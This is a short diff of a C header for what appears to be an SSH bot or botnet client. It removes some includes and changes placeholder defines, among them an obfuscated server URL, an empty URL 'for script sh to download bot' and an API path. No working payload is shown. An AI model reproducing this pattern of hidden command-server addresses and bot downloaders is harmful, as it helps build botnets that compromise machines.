@@ -9,11 +9,7 @@
 # ifndef PX_SSH_H
 # define PX_SSH_H
 
-# include <openssl/ssl.h>
-# include <openssl/err.h>
-# include <openssl/bio.h>
 # include <sys/resource.h>
-# include <stdlib.h>
 # include <stdio.h> 
 # include <string.h>
 # include <unistd.h>
@@ -66,7 +62,7 @@
 # include "libft.h"
 
 # define url "google.com" // fake url
-# define stringifer "" //url obfusced (ex : api.pandeo.fr == Zib'vZg]^u'_k)
+# define stringifer "" //url obfusced (ex : api.example.com == Zib'kqZfir^'\hs
 # define download_url "" // url for script sh to download bot
 # define url_page "/api.php" // path for api
 
